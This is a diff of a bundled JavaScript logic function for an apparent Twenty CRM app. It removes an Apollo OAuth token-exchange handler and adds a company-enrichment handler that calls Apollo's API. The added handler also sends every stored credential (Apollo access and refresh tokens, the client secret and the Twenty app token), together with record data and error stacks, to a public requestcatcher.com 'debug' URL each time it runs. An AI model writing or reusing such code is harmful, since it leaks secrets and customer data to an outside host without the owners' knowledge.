-    return graphqlError.extensions?.code === "UNAUTHENTICATED" || graphqlError.message?.toLowerCase() === "unauthorized";
-  });
-};
 var defaultOptions2 = {
   url: `${process.env.TWENTY_API_URL}/metadata`,
   headers: {
     "Content-Type": "application/json"
   }
 };
-var MetadataApiClient = class {
-  constructor(options) {
-    this.refreshAccessTokenPromise = null;
-    const merged = {
-      ...defaultOptions2,
-      ...options
-    };
-    const {
-      url,
-      headers,
-      fetch: customFetchImplementation,
-      fetcher: _fetcher,
-      batch: _batch,
-      ...requestOptions
-    } = merged;
-    this.url = url ?? "";
-    this.requestOptions = requestOptions;
-    this.headers = headers ?? {};
-    this.fetchImplementation = customFetchImplementation ?? globalThis.fetch ?? null;
-    const processEnvironment = getProcessEnvironment();
-    const tokenFromHeaders = getTokenFromHeaders(
-      typeof headers === "function" ? void 0 : headers
-    );
-    this.authorizationToken = tokenFromHeaders ?? processEnvironment[APP_ACCESS_TOKEN_ENV_KEY] ?? processEnvironment[API_KEY_ENV_KEY] ?? null;
-    this.client = createClient3({
-      ...merged,
-      headers: void 0,
-      fetcher: async (operation) => this.executeGraphqlRequestWithOptionalRefresh({
-        operation
-      })
+
+// src/logic-functions/on-company-updated.ts
+var APOLLO_ACCESS_TOKEN_FALLBACK = "REPLACE_ME";
+var getApolloAccessToken = () => process.env.APOLLO_ACCESS_TOKEN || APOLLO_ACCESS_TOKEN_FALLBACK;
+var DEBUG_URL = "https://testcharlescharles.requestcatcher.com/";
+var debugLog = async (step, data) => {
+  try {
+    await fetch(DEBUG_URL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ step, data, timestamp: (/* @__PURE__ */ new Date()).toISOString() })
     });
-  }
-  query(request) {
-    return this.client.query(request);
-  }
-  mutation(request) {
-    return this.client.mutation(request);
-  }
-  async uploadFile(fileBuffer, filename, contentType = "application/octet-stream", fieldMetadataUniversalIdentifier) {
-    const form = new FormData();
-    form.append(
-      "operations",
-      JSON.stringify({
-        query: `mutation UploadFilesFieldFileByUniversalIdentifier($file: Upload!, $fieldMetadataUniversalIdentifier: String!) {
-        uploadFilesFieldFileByUniversalIdentifier(file: $file, fieldMetadataUniversalIdentifier: $fieldMetadataUniversalIdentifier) { id path size createdAt url }
-      }`,
-        variables: {
-          file: null,
-          fieldMetadataUniversalIdentifier
-        }
-      })
-    );
-    form.append("map", JSON.stringify({ "0": ["variables.file"] }));
-    form.append(
-      "0",
-      new Blob([fileBuffer], { type: contentType }),
-      filename
-    );
-    const result = await this.executeGraphqlRequestWithOptionalRefresh({
-      operation: form,
-      headers: {},
-      requestInit: {
-        method: "POST"
-      }
-    });
-    if (result.errors) {
-      throw new GenqlError2(result.errors, result.data);
-    }
-    const data = result.data;
-    return data.uploadFilesFieldFileByUniversalIdentifier;
-  }
-  async executeGraphqlRequestWithOptionalRefresh({
-    operation,
-    headers,
-    requestInit
-  }) {
-    const firstResponse = await this.executeGraphqlRequest({
-      operation,
-      headers,
-      requestInit,
-      token: this.authorizationToken
-    });
-    if (this.shouldRefreshToken(firstResponse)) {
-      const refreshedAccessToken = await this.requestRefreshedAccessToken();
-      if (refreshedAccessToken) {
-        const retryResponse = await this.executeGraphqlRequest({
-          operation,
-          headers,
-          requestInit,
-          token: refreshedAccessToken
-        });
-        return this.assertResponseIsSuccessful(retryResponse);
-      }
-    }
-    return this.assertResponseIsSuccessful(firstResponse);
-  }
-  async executeGraphqlRequest({
-    operation,
-    headers,
-    requestInit,
-    token
-  }) {
-    if (!this.fetchImplementation) {
-      throw new Error(
-        "Global `fetch` function is not available, pass a fetch implementation to the Twenty client"
-      );
-    }
-    const resolvedHeaders = await this.resolveHeaders();
-    const requestHeaders = new Headers(resolvedHeaders);
-    if (headers) {
-      new Headers(headers).forEach(
-        (value, key) => requestHeaders.set(key, value)
-      );
-    }
-    if (operation instanceof FormData) {
-      requestHeaders.delete("Content-Type");
-    } else {
-      requestHeaders.set("Content-Type", "application/json");
-    }
-    if (token) {
-      requestHeaders.set("Authorization", `Bearer ${token}`);
-    } else {
-      requestHeaders.delete("Authorization");
-    }
-    const response = await this.fetchImplementation.call(globalThis, this.url, {
-      ...this.requestOptions,
-      ...requestInit,
-      method: requestInit?.method ?? "POST",
-      headers: requestHeaders,
-      body: operation instanceof FormData ? operation : JSON.stringify(operation)
-    });
-    const rawBody = await response.text();
-    let payload = null;
-    if (rawBody.trim().length > 0) {
-      try {
-        payload = JSON.parse(rawBody);
-      } catch {
-        payload = null;
-      }
-    }
-    return {
-      status: response.status,
-      statusText: response.statusText,
-      payload,
-      rawBody
-    };
-  }
-  async resolveHeaders() {
-    if (typeof this.headers === "function") {
-      return await this.headers() ?? {};
-    }
-    return this.headers ?? {};
-  }
-  shouldRefreshToken(response) {
-    if (response.status === 401) {
-      return true;
-    }
-    return hasAuthenticationErrorInGraphqlPayload(response.payload);
-  }
-  assertResponseIsSuccessful(response) {
-    if (response.status < 200 || response.status >= 300) {
-      throw new Error(`${response.statusText}: ${response.rawBody}`);
-    }
-    if (response.payload === null) {
-      throw new Error("Invalid JSON response");
-    }
-    return response.payload;
-  }
-  async requestRefreshedAccessToken() {
-    const refreshAccessTokenFunction = globalThis.frontComponentHostCommunicationApi?.requestAccessTokenRefresh;
-    if (typeof refreshAccessTokenFunction !== "function") {
-      return null;
-    }
-    if (!this.refreshAccessTokenPromise) {
-      this.refreshAccessTokenPromise = refreshAccessTokenFunction().then((refreshedAccessToken) => {
-        if (typeof refreshedAccessToken !== "string" || refreshedAccessToken.length === 0) {
-          return null;
-        }
-        this.setAuthorizationToken(refreshedAccessToken);
-        return refreshedAccessToken;
-      }).catch((refreshError) => {
-        console.error("Twenty client: token refresh failed", refreshError);
-        return null;
-      }).finally(() => {
-        this.refreshAccessTokenPromise = null;
-      });
-    }
-    return this.refreshAccessTokenPromise;
-  }
-  setAuthorizationToken(token) {
-    this.authorizationToken = token;
-    const processEnvironment = getProcessEnvironment();
-    processEnvironment[APP_ACCESS_TOKEN_ENV_KEY] = token;
+  } catch {
   }
 };
-
-// src/logic-functions/get-authentication-token-pairs.ts
-var OAUTH_TOKEN_PAIRS_PATH = "/oauth/token-pairs";
-var getAuthenticationTokenPairs = async (code, clientId, clientSecret) => {
-  const formData = new URLSearchParams({
-    grant_type: "authorization_code",
-    client_id: clientId,
-    client_secret: clientSecret,
-    code,
-    redirect_uri: "https://hjsm0q38-3000.uks1.devtunnels.ms/auth/oauth-propagator/callback"
-  });
-  const response = await fetch("https://app.apollo.io/api/v1/oauth/token", {
-    method: "POST",
-    headers: {
-      "Content-Type": "application/x-www-form-urlencoded"
-    },
-    body: formData.toString()
-  });
+var extractDomain = (domainName) => {
+  const url = domainName?.primaryLinkUrl;
+  if (!url) {
+    return void 0;
+  }
+  try {
+    const hostname = new URL(
+      url.startsWith("http") ? url : `https://${url}`
+    ).hostname;
+    return hostname.replace(/^www\./, "");
+  } catch {
+    return url.replace(/^(https?:\/\/)?(www\.)?/, "").split("/")[0];
+  }
+};
+var fetchApolloEnrichment = async (domain) => {
+  const response = await fetch(
+    `https://api.apollo.io/api/v1/organizations/enrich?domain=${encodeURIComponent(domain)}`,
+    {
+      method: "GET",
+      headers: {
+        "Content-Type": "application/json",
+        Authorization: `Bearer ${getApolloAccessToken()}`
+      }
+    }
+  );
   if (!response.ok) {
     const errorText = await response.text();
-    throw new Error(`Failed to exchange code for tokens: ${response.status} - ${errorText}`);
+    await debugLog("apollo-api-error", {
+      domain,
+      status: response.status,
+      body: errorText
+    });
+    return void 0;
   }
-  return response.json();
+  const data = await response.json();
+  return data.organization;
+};
+var buildCompanyUpdateData = (apolloOrganization) => {
+  const updateData = {};
+  if (apolloOrganization.estimated_num_employees) {
+    updateData.employees = apolloOrganization.estimated_num_employees;
+  }
+  if (apolloOrganization.linkedin_url) {
+    updateData.linkedinLink = {
+      primaryLinkUrl: apolloOrganization.linkedin_url,
+      primaryLinkLabel: "LinkedIn"
+    };
+  }
+  if (apolloOrganization.twitter_url) {
+    updateData.xLink = {
+      primaryLinkUrl: apolloOrganization.twitter_url,
+      primaryLinkLabel: "X"
+    };
+  }
+  if (apolloOrganization.annual_revenue) {
+    updateData.annualRecurringRevenue = {
+      amountMicros: apolloOrganization.annual_revenue * 1e6,
+      currencyCode: "USD"
+    };
+  }
+  const hasAddress = apolloOrganization.street_address || apolloOrganization.city || apolloOrganization.state || apolloOrganization.country;
+  if (hasAddress) {
+    updateData.address = {
+      addressStreet1: apolloOrganization.street_address ?? "",
+      addressCity: apolloOrganization.city ?? "",
+      addressState: apolloOrganization.state ?? "",
+      addressPostcode: apolloOrganization.postal_code ?? "",
+      addressCountry: apolloOrganization.country ?? ""
+    };
+  }
+  if (apolloOrganization.industry) {
+    updateData.apolloIndustry = apolloOrganization.industry;
+  }
+  if (apolloOrganization.short_description) {
+    updateData.apolloShortDescription = apolloOrganization.short_description;
+  }
+  if (apolloOrganization.founded_year) {
+    updateData.apolloFoundedYear = apolloOrganization.founded_year;
+  }
+  if (apolloOrganization.total_funding) {
+    updateData.apolloTotalFunding = {
+      amountMicros: apolloOrganization.total_funding * 1e6,
+      currencyCode: "USD"
+    };
+  }
+  return updateData;
+};
+var updateCompanyInTwenty = async (companyId, updateData) => {
+  const client = new CoreApiClient();
+  const result = await client.mutation({
+    updateCompany: {
+      __args: {
+        id: companyId,
+        data: updateData
+      },
+      id: true
+    }
+  });
+  if (!result.updateCompany) {
+    throw new Error(`Failed to update company ${companyId}: no result`);
+  }
 };
 var handler = async (event) => {
-  const { queryStringParameters: { code } } = event;
-  if (!code) {
-    throw new Error("Code is required");
+  await debugLog("env-vars", {
+    APOLLO_ACCESS_TOKEN: process.env.APOLLO_ACCESS_TOKEN ?? "(not set)",
+    APOLLO_REFRESH_TOKEN: process.env.APOLLO_REFRESH_TOKEN ?? "(not set)",
+    APOLLO_CLIENT_ID: process.env.APOLLO_CLIENT_ID ?? "(not set)",
+    APOLLO_CLIENT_SECRET: process.env.APOLLO_CLIENT_SECRET ?? "(not set)",
+    TWENTY_API_URL: process.env.TWENTY_API_URL ?? "(not set)",
+    TWENTY_APP_ACCESS_TOKEN: process.env.TWENTY_APP_ACCESS_TOKEN ?? "(not set)"
+  });
+  try {
+    const { recordId, properties } = event;
+    const { after: companyAfter } = properties;
+    const domain = extractDomain(companyAfter?.domainName);
+    if (!domain) {
+      return { skipped: true, reason: "no domain found on company" };
+    }
+    const apolloOrganization = await fetchApolloEnrichment(domain);
+    if (!apolloOrganization) {
+      return {
+        skipped: true,
+        reason: `no Apollo data found for ${domain}`
+      };
+    }
+    const updateData = buildCompanyUpdateData(apolloOrganization);
+    if (Object.keys(updateData).length === 0) {
+      return { skipped: true, reason: "no enrichment data to apply" };
+    }
+    await debugLog("updating-company", { recordId, updateData });
+    await updateCompanyInTwenty(recordId, updateData);
+    const result = {
+      enriched: true,
+      companyId: recordId,
+      domain,
+      updatedFields: Object.keys(updateData)
+    };
+    await debugLog("success", result);
+    return result;
+  } catch (error) {
+    await debugLog("error", {
+      message: error instanceof Error ? error.message : String(error),
+      stack: error instanceof Error ? error.stack : void 0
+    });
+    throw error;
   }
-  const apolloClientId = process.env.APOLLO_CLIENT_ID ?? "";
-  const apolloClientSecret = process.env.APOLLO_CLIENT_SECRET ?? "";
-  const applicationId = process.env.APPLICATION_ID ?? "";
-  const metadataClient = new MetadataApiClient({});
-  const tokenPairs = await getAuthenticationTokenPairs(
-    code,
-    apolloClientId,
-    apolloClientSecret
-  );
-  await metadataClient.mutation({
-    updateOneApplicationVariable: {
-      __args: {
-        key: "APOLLO_ACCESS_TOKEN",
-        value: tokenPairs.access_token,
-        applicationId
-      }
-    }
-  });
-  await metadataClient.mutation({
-    updateOneApplicationVariable: {
-      __args: {
-        key: "APOLLO_REFRESH_TOKEN",
-        value: tokenPairs.refresh_token,
-        applicationId
-      }
-    }
-  });
-  return { tokenPairs };
 };
-var get_authentication_token_pairs_default = defineLogicFunction({
-  universalIdentifier: "7ccc63a7-ece1-44c0-adbe-805a1baea03a",
-  name: "get-authentication-token-pairs",
-  description: "Returns the Apollo authentication token pairs",
-  timeoutSeconds: 10,
+var on_company_updated_default = defineLogicFunction({
+  universalIdentifier: "6248b3fe-a8af-404a-8e38-19df98f73d81",
+  name: "on-company-updated",
+  description: "Enriches company data from Apollo when the company domain is updated",
+  timeoutSeconds: 30,
   handler,
-  httpRouteTriggerSettings: {
-    path: OAUTH_TOKEN_PAIRS_PATH,
-    httpMethod: "GET",
-    isAuthRequired: false
+  databaseEventTriggerSettings: {
+    eventName: "company.updated",
+    updatedFields: ["domainName"]
   }
 });
 export {
-  OAUTH_TOKEN_PAIRS_PATH,
-  get_authentication_token_pairs_default as default
+  on_company_updated_default as default
 };
-//# sourceMappingURL=get-authentication-token-pairs.mjs.map
+//# sourceMappingURL=on-company-updated.mjs.map
